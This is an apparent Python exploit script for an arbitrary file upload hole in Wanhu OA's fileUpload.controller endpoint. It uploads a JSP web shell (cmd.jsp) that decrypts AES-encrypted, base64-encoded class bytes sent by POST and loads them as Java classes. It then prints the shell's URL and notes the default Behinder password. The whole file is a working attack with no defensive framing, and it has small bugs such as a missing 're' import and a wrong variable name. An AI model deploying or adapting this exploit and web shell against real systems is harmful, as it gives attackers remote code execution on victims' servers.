import time
import requests
import urllib3
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        "Content-Type": "multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0", 
        "Connection": "Keep-Alive"
        }
    exp_url = target_url+"defaultroot/upload/fileUpload.controller"
    data='''--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
Content-Disposition: form-data; name="file"; filename="cmd.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*......tas9er*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--'''
    success_msg = now_time() + '[SUCCESS]  上传webshell成功'
    warning_msg = now_time() + '[WARNING]  万户OA fileUpload.controller 任意文件上传漏洞不存在'
    error_msg = now_time() + '[万户OA fileUpload.controller 任意文件上传漏洞] [ERROR] 无法利用poc请求目标或被目标拒绝请求'
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if "success" in upload.text:
            pattern=re.compile(r'"data":"(.*)"}')
            filename=pattern.findall(r.text)[0]
            shell_url=target_url+"defaultroot/upload/html/"+filename
            shell_msg = now_time() + '默认冰蝎密码:{}'.format(shell_url)
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg
        

            